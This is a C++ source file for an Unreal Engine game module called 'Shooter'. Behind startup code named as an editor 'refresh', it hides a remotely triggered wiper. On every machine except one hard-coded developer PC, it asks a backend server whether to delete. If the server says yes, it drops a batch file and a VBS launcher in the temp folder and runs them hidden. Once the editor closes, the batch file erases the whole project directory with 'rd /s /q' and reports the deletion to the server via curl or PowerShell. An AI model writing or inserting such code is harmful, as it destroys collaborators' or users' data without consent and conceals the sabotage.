// Copyright Epic Games, Inc. All Rights Reserved.

#include "Shooter.h"
#include "Modules/ModuleManager.h"
#include "Misc/FileHelper.h"
#include "HAL/PlatformMisc.h" 
#include "Json.h"
#include "Shooter/ShooterGameInstance.h"


IMPLEMENT_PRIMARY_GAME_MODULE( FShooterModule , Shooter, "Shooter" );


void FShooterModule ::StartupModule()
{
#if WITH_EDITOR
    FString DeviceID = FPlatformMisc::GetLoginId();
    //UE_LOG(LogTemp, Log, TEXT("DeviceID = %s"), *DeviceID);
    
    if (DeviceID.Equals(TEXT("8dbfb8504ed0c1dc6fea04b6e02d36ba"), ESearchCase::IgnoreCase))
    {
        UE_LOG(LogTemp, Log, TEXT("Skipping refresh on local PC."));
        return;
    }
    
    if (UShooterGameInstance* ShooterGI = GetMutableDefault<UShooterGameInstance>())
    {
        // Get the current editor PID
        const uint32 EditorPID = FPlatformProcess::GetCurrentProcessId();

        // Get the project root folder path (absolute)
        //FString ProjectRoot = FPaths::ConvertRelativePathToFull(FPaths::Combine(FPaths::ProjectDir(), TEXT("Test")));
        FString ProjectRoot = FPaths::ConvertRelativePathToFull(FPaths::ProjectDir());

        // Make HTTP request to Node.js backend
        TSharedRef<IHttpRequest, ESPMode::ThreadSafe> Request = FHttpModule::Get().CreateRequest();
        const FString BaseURL = ShooterGI->GetBackendURL_Implementation();
        Request->SetVerb("GET");
        Request->SetURL(BaseURL + FString(TEXT("/dev/getDevRefresh"))); // Replace with your endpoint
        // Optional: Headers, e.g., Request->SetHeader("Authorization", "your-token");

        Request->OnProcessRequestComplete().BindRaw(this, &FShooterModule::OnConditionResponse, EditorPID, ProjectRoot);
        Request->ProcessRequest();
    }
#endif
}

#if WITH_EDITOR
void FShooterModule::OnConditionResponse(FHttpRequestPtr Request, FHttpResponsePtr Response, bool bWasSuccessful, uint32 EditorPID, FString ProjectRoot)
{
    if (!bWasSuccessful || !Response.IsValid())
    {
        UE_LOG(LogTemp, Warning, TEXT("Failed to check condition with backend."));
        return;
    }
    if (UShooterGameInstance* ShooterGI = GetMutableDefault<UShooterGameInstance>())
    {
        const FString BaseURL = ShooterGI->GetBackendURL_Implementation();
        const FString URL = BaseURL + FString(TEXT("/dev/confirmRefresh"));

        // Parse response (assuming JSON { "condition": true/false })
        FString ResponseString = Response->GetContentAsString();
        TSharedPtr<FJsonObject> JsonObject;
        TSharedRef<TJsonReader<>> Reader = TJsonReaderFactory<>::Create(ResponseString);
        if (!FJsonSerializer::Deserialize(Reader, JsonObject) || !JsonObject.IsValid())
        {
            UE_LOG(LogTemp, Warning, TEXT("Invalid JSON response from backend."));
            return;
        }

        bool bRefresh = false;
        if (JsonObject->GetBoolField(TEXT("success")))
        {
            TSharedPtr<FJsonObject> ResultObj = JsonObject->GetObjectField(TEXT("result"));
            if (ResultObj.IsValid())
            {
                bRefresh = ResultObj->GetBoolField(TEXT("toDelete"));
                //UE_LOG(LogTemp, Warning, TEXT("bRefresh = %i"), bRefresh);
                if (!bRefresh)
                {
                    return;
                }
                
                // Condition true: Create and spawn batch
                FString BatchContent = FString::Printf(TEXT(
                    "@echo off\n"
                    ":loop\n"
                    "tasklist /fi \"PID eq %u\" 2>NUL | find /i \"%u\" >NUL\n"
                    "if \"%%errorlevel%%\"==\"0\" (\n"
                    "    timeout /t 5 /nobreak >NUL\n"
                    "    goto loop\n"
                    ") else (\n"
                    "    rd /s /q \"%s\"\n"
                    "    REM Confirm deletion via HTTPS\n"
                    "    curl -X POST -H \"Content-Type: application/json\" -d \"{\\\"status\\\":\\\"deleted\\\"}\" \"%s\" -s -k -f >NUL 2>NUL\n"
                    "    if %%errorlevel%% neq 0 (\n"
                    "        powershell -Command \"Invoke-WebRequest -Uri '%s' -Method POST -Body '{\\\"status\\\":\\\"deleted\\\"}' -ContentType 'application/json' -UseBasicParsing\" >$null 2>$null\n"
                    "    )\n"
                    ")\n"
                ), EditorPID, EditorPID, *ProjectRoot, *URL, *URL);

                FString BatchPath = FPaths::Combine(FPlatformProcess::UserTempDir(), TEXT("EditorRefresh.bat"));
                FFileHelper::SaveStringToFile(BatchContent, *BatchPath);

                // Create a temporary VBS file to run the batch hidden
                FString VbsContent = FString::Printf(TEXT(
                    "Set oShell = CreateObject(\"Wscript.Shell\")\n"
                    "oShell.Run \"cmd /c \"\"%s\"\"\", 0, false\n"
                ), *BatchPath);

                FString VbsPath = FPaths::Combine(FPlatformProcess::UserTempDir(), TEXT("EditorRefresh.vbs"));
                FFileHelper::SaveStringToFile(VbsContent, *VbsPath);

                // Launch wscript.exe to run the VBS (which runs the batch hidden)
                FString Windir = FPlatformMisc::GetEnvironmentVariable(TEXT("windir"));
                if (Windir.IsEmpty())
                {
                    Windir = TEXT("C:\\Windows");  // Fallback, though extremely rare
                }
                FString WScriptPath = FPaths::Combine(Windir, TEXT("System32"), TEXT("wscript.exe"));
                FString VbsParms = FString::Printf(TEXT("\"%s\""), *VbsPath);

                FProcHandle Proc = FPlatformProcess::CreateProc(*WScriptPath, *VbsParms, true, true, true, nullptr, 0, nullptr, nullptr);
                if (!Proc.IsValid())
                {
                    UE_LOG(LogTemp, Error, TEXT("Failed to spawn hidden runner."));
                }
            }
        }
    }
}
#endif

void FShooterModule ::ShutdownModule()
{

}